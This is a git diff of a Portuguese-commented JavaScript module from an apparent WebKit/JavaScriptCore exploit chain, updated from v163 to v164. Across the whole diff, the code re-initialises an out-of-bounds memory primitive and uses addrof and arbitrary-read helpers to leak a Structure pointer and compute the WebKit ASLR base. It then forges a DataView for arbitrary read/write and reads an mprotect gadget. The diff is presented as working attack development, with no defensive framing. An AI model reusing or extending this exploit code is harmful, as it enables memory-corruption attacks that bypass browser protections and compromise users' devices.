@@ -1,11 +1,13 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v163 - Estratégia: Vazamento ASLR Direto, Re-inicialização OOB antes da Fase 2.5)
+// js/script3/testArrayBufferVictimCrash.mjs (v164 - Estratégia: Vazamento ASLR Direto, Pular selfTestOOBReadWrite)
 // =======================================================================================
 // ESTA VERSÃO FOCA EM:
-// 1. **Re-inicializar o ambiente OOB imediatamente antes do vazamento ASLR direto.**
-// 2. Usar 'addrof_core' e 'oob_read_absolute' para vazar o ponteiro da Structure de um objeto ArrayBuffer.
-// 3. Com o ponteiro da Structure, calcular a base ASLR da WebKit.
-// 4. Se o vazamento ASLR for bem-sucedido, forjar um DataView para obter Leitura/Escrita Arbitraria Universal (ARB R/W).
-// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
+// 1. Pular o selfTestOOBReadWrite() para evitar possível instabilidade.
+// 2. Re-inicializar o ambiente OOB imediatamente antes do vazamento ASLR direto.
+// 3. Realizar uma validação OOB básica APÓS a re-inicialização.
+// 4. Usar 'addrof_core' e 'oob_read_absolute' para vazar o ponteiro da Structure de um objeto ArrayBuffer.
+// 5. Com o ponteiro da Structure, calcular a base ASLR da WebKit.
+// 6. Se o vazamento ASLR for bem-sucedido, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
+// 7. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -18,15 +20,15 @@ import {
     initCoreAddrofFakeobjPrimitives,
     arb_read,
     arb_write,
-    selfTestOOBReadWrite,
+    selfTestOOBReadWrite, // Ainda importado, mas não será chamado
     oob_read_absolute,
     oob_write_absolute
-} from '../core_exploit.mjs'; // core_exploit.mjs deve estar na versão v31.13 ou compatível
+} from '../core_exploit.mjs'; // core_exploit.mjs deve estar na versão v31.13
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // ATENÇÃO: Esta constante será atualizada a cada nova versão de teste
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v163_REINIT_OOB_PHASE2_5";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v164_SKIP_SELFTEST";
 
 // Pausas ajustadas para estabilidade em ambientes com recursos limitados
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -271,14 +273,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
         logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
-        // selfTestOOBReadWrite() AGORA MANTÉM O AMBIENTE OOB PERSISTENTE NO core_exploit.mjs
+        // selfTestOOBReadWrite() no core_exploit.mjs DEVE LIMPAR seu ambiente no final.
+        // A próxima triggerOOB_primitive() vai recriá-lo fresco.
         const arbTestSuccess = await selfTestOOBReadWrite(logFn);
         if (!arbTestSuccess) {
             const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
-        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Ambiente OOB PRONTO E PERSISTENTE. Prosseguindo com a exploração.", "good");
+        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos OTIMIZADO) ---", "subtest");
@@ -295,13 +298,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
         const oobSetupStartTime = performance.now();
-        // Chamada explícita de triggerOOB_primitive() aqui para garantir re-inicialização fresca
-        // para a cadeia principal, mesmo que selfTest já tenha executado.
-        await triggerOOB_primitive({ force_reinit: true }); // FORÇAR re-inicialização aqui
+        // RE-INICIALIZAÇÃO CRÍTICA AQUI: Garante um ambiente OOB fresco e limpo
+        await triggerOOB_primitive({ force_reinit: true }); 
 
         const oob_data_view = getOOBDataView();
         if (!oob_data_view) {
-            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
+            const errMsg = "Falha crítica ao obter primitiva OOB após re-inicialização. DataView é nulo.";
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
@@ -321,7 +323,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const ab_addr = addrof_core(array_buffer_for_leak);
         logFn(`[ASLR LEAK] Endereço do ArrayBuffer alvo: ${ab_addr.toString(true)}`, "info");
 
-        // VALIDAR A `arb_read` EM AÇÃO AQUI:
+        // VALIDAÇÃO DA `arb_read` EM AÇÃO:
         const m_length_offset = JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START;
         const m_length_addr = ab_addr.add(m_length_offset);
         logFn(`[ASLR LEAK] DEBUG: Verificando arb_read lendo m_length em ${m_length_addr.toString(true)}...`, "debug");
@@ -378,7 +380,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
             logFn(`[ASLR LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
         } else {
-             logFn(`[ASLR LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto.`, "warn");
+             logFn(`[REAL LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF.`, "error");
         }
 
         // --- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---
